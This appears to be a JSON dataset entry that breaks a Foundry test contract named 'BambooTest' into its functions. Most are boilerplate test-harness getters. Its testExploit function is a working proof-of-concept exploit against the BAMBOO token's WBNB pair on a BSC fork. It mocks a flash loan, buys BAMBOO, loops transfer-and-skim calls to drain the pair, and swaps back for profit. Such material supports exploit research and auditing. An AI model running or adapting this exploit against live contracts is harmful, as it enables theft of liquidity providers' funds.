[
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 29_668_034);\n\n        vm.label(address(wbnb), \"WBNB\");\n        vm.label(address(bamboo), \"BAMBOO\");\n        vm.label(address(router), \"PancakeRouter\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "BambooTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // get a flash loan (lets mock it out)\n        deal(address(wbnb), address(this), 4000 ether);\n\n        console.log(\"start balance after flashloan\", toEth(wbnb.balanceOf(address(this))));\n\n        uint256 bambooBalance = bamboo.balanceOf(address(wbnbBambooPair));\n\n        address[] memory path;\n        path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(bamboo);\n        uint256[] memory amounts = router.getAmountsIn(bambooBalance * 9 / 10, path);\n\n        wbnb.approve(address(router), type(uint256).max);\n        router.swapExactTokensForTokens(amounts[1], 0, path, address(this), block.timestamp);\n\n        uint256 max = 10_000;\n        for (uint256 i; i < max; ++i) {\n            bamboo.transfer(address(wbnbBambooPair), 1_343_870_967_101_818_317);\n            wbnbBambooPair.skim(address(this));\n        }\n\n        path[0] = address(bamboo);\n        path[1] = address(wbnb);\n        bamboo.approve(address(router), type(uint256).max);\n\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            bamboo.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n\n        console.log(\"profit after return flashloan\", toEth(wbnb.balanceOf(address(this)) - 4000 ether));\n    }\n",
    "description": ""
  }
]